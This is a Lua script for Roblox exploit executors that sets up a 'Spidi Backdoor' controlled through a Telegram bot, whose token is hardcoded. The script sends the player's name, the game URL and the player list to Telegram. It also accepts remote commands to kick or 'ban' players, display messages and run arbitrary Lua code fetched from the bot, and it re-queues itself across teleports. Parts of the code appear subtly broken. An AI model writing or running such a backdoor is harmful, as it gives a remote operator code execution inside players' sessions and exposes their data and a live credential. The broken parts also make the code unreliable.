if not game:IsLoaded() then game.Loaded:Wait() end

local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local function request(method, url, headers, body)
    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if req then
        local args = { Url = url, Method = method, Headers = headers or {} }
        if body then args.Body = body end
        return req(args)
    end
    return nil
end

local function sendToTelegram(text)
    if not CHAT_ID then return nil end
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage"
    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
    request("POST", url, { ["Content-Type"] = "application/json" }, HttpService:JSONEncode(payload))
end

local function getChatId()
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates"
    local res = request("GET", url, {})
    if res and res.Body then
        local success, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if success and data and data.result and #data.result > 0 then
            CHAT_ID = data.result[#data.result].message.chat.id
            return true
        end
    end
    return false
end

local function showNotification(title, text, duration)
    duration = duration or 5
    local notif = Instance.new("ScreenGui")
    notif.Name = "SpidiNotification"
    notif.ResetOnSpawn = false
    notif.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 500, 0, 70)
    frame.Position = UDim2.new(0.5, -250, 0, 20)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = notif
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 0)
    stroke.Thickness = 2
    stroke.Parent = frame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -20, 0, 25)
    titleLabel.Position = UDim2.new(0, 10, 0, 5)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title or "Spidi Backdoor"
    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    titleLabel.TextSize = 18
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = frame
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 0, 30)
    textLabel.Position = UDim2.new(0, 10, 0, 32)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text or ""
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextSize = 15
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextWrapped = true
    textLabel.Parent = frame
    
    frame.BackgroundTransparency = 1
    frame.Position = UDim2.new(0.5, -250, 0, -100)
    game:GetService("TweenService"):Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.1,
        Position = UDim2.new(0.5, -250, 0, 20)
    }):Play()
    
    game:GetService("Debris"):AddItem(notif, duration)
end

local function findPlayer(partialName)
    local matches = {}
    local lowerPartial = partialName:lower()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower():find(lowerPartial, 1, true) or p.DisplayName:lower():find(lowerPartial, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then
        return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do table.insert(names, p.Name) end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else
        return nil, "Игрок не найден"
    end
end

local function handleCommand(cmd, args)
    local targetName = args[1]
    local target = nil
    local errorMsg = nil
    
    if targetName and cmd ~= "help" and cmd ~= "players" then
        target, errorMsg = findPlayer(targetName)
        if not target then
            sendToTelegram("❌ "..tostring(errorMsg))
            return
        end
    end
    
    local placeUrl = "https://www.roblox.com/games/"..game.PlaceId
    local playerInfo = "👤 "..Players.LocalPlayer.Name.."\n🔗 "..placeUrl
    
    if cmd == "kick" then
        if target then
            target:Kick("Kicked by Spidi Backdoor")
            sendToTelegram("✅ Кикнут: <b>"..target.Name.."</b>\n"..playerInfo)
            showNotification("Spidi Backdoor", "✅ Кикнут: "..target.Name, 4)
        else
            sendToTelegram("❌ Укажи ник: /kick ник")
        end
        
    elseif cmd == "ban" then
        if target then
            target:Kick("Banned by Spidi Backdoor")
            sendToTelegram("✅ Забанен: <b>"..target.Name.."</b>\n"..playerInfo)
            showNotification("Spidi Backdoor", "✅ Забанен: "..target.Name, 4)
        else
            sendToTelegram("❌ Укажи ник: /ban ник")
        end
        
    elseif cmd == "message" then
        if target then
            local msg = table.concat(args, " ", 2)
            showNotification("📩 Spidi Backdoor", msg, 6)
            sendToTelegram("✅ Сообщение <b>"..target.Name.."</b>: "..msg.."\n"..playerInfo)
        else
            sendToTelegram("❌ Укажи ник: /message ник текст")
        end
        
    elseif cmd == "execute" then
        local code = table.concat(args, " ", 2)
        sendToTelegram("⏳ Выполнение: <code>"..code.."</code>")
        local success, result = pcall(function() return loadstring(code)() end)
        if success then
            sendToTelegram("✅ Код выполнен\n"..playerInfo)
        else
            sendToTelegram("❌ Ошибка: <code>"..tostring(result).."</code>")
        end
        
    elseif cmd == "players" then
        local list = {}
        for _, p in pairs(Players:GetPlayers()) do
            table.insert(list, p.Name)
        end
        sendToTelegram("👥 <b>Игроков:</b> "..#list.."\n"..table.concat(list, ", "))
        
    elseif cmd == "start" then
        sendToTelegram("✅ <b>Spidi Backdoor активирован!</b>\n"..playerInfo)
        showNotification("Spidi Backdoor", "✅ Бот подключен! Жду команд.", 3)
        
    elseif cmd == "help" then
        sendToTelegram("📋 <b>Команды:</b>\n/kick ник - кикнуть\n/ban ник - забанить\n/message ник текст - сообщение\n/execute код - выполнить код\n/players - список игроков\n/help - помощь")
        
    else
        sendToTelegram("❌ Неизвестная команда: "..cmd)
    end
end

local lastUpdateId = 0
local function getUpdates()
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastUpdateId + 1).."&timeout=5"
    local res = request("GET", url, {})
    if res and res.Body then
        local success, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if success and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    local text = msg.text
                    local chatId = msg.chat.id
                    if CHAT_ID == nil then
                        CHAT_ID = chatId
                        local placeUrl = "https://www.roblox.com/games/"..game.PlaceId
                        sendToTelegram("✅ <b>Spidi Backdoor активирован!</b>\n👤 "..Players.LocalPlayer.Name.."\n🔗 "..placeUrl)
                    end
                    if text:match("^/") then
                        local args = {}
                        for word in string.gmatch(text, "%S+") do table.insert(args, word) end
                        local cmd = args[1]:sub(2):lower()
                        table.remove(args, 1)
                        handleCommand(cmd, args)
                    end
                end
                if update.update_id then
                    lastUpdateId = update.update_id
                end
            end
        end
    end
end

task.spawn(function()
    while true do
        pcall(getUpdates)
        task.wait(1)
    end
end)

-- ==================== GUI ====================
local function createGUI()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui", 10)
    if not playerGui then return nil end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "Spidi Backdoor"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screenGui

    local uiStroke = Instance.new("UIStroke")
    uiStroke.Thickness = 2
    uiStroke.Color = Color3.fromRGB(255, 255, 255)
    uiStroke.Parent = frame

    local gradient = Instance.new("UIGradient")
    gradient.Rotation = 50
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
    }
    gradient.Parent = uiStroke

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = frame

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Text = "Spidi Backdoor"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.TextSize = 36
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame

    local textLabel = Instance.new("TextLabel")
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.new(1, -40, 0, 80)
    textLabel.Position = UDim2.new(0, 20, 0, 70)
    textLabel.Text = "Spidi Backdoor Active!\nTelegram Bot Connected"
    textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    textLabel.TextSize = 18
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.Parent = frame

    local closeBtn = Instance.new("TextButton")
    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    closeBtn.Size = UDim2.new(0, 140, 0, 40)
    closeBtn.Position = UDim2.new(0.5, -70, 0.75, 0)
    closeBtn.Text = "OK"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 18
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = closeBtn

    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    local UIS = game:GetService("UserInputService")
    local dragToggle, dragStart, startPos, dragInput
    
    frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragToggle = false end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    return screenGui
end

-- ==================== АВТО-ЭКСЕКЬЮТ (РАБОТАЕТ ВЕЗДЕ) ====================
local function autoExecute()
    local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
    if queueteleport then
        queueteleport("loadstring([[" .. string.dump(createGUI) .. "]])()")
        return true
    end
    return false
end

-- ==================== ЗАПУСК ====================
createGUI()
autoExecute()

task.wait(2)
getChatId()
